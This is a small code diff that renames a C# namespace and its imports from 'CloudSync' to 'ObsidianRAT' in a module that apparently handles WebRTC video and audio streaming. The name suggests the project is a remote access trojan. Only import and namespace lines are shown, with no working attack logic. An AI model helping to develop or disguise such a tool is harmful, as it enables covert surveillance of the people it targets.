@@ -1,5 +1,5 @@
-using CloudSync.Services.Modules.Stream.Sound;
-using CloudSync.Services.Modules.Stream.Codec;
+using ObsidianRAT.Services.Modules.Stream.Sound;
+using ObsidianRAT.Services.Modules.Stream.Codec;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -8,9 +8,9 @@ using System.Threading.Tasks;
 using SIPSorcery.Net;
 using SIPSorceryMedia.Abstractions;
 using SIPSorceryMedia.Encoders;
-using OpusAudioEncoder = CloudSync.Services.Modules.Stream.Sound.OpusEncoder;
+using OpusAudioEncoder = ObsidianRAT.Services.Modules.Stream.Sound.OpusEncoder;
 
-namespace CloudSync.Services.Modules.Stream.Signaling
+namespace ObsidianRAT.Services.Modules.Stream.Signaling
 {
     /// <summary>
     /// Manages the WebRTC peer connection with video and audio streaming.
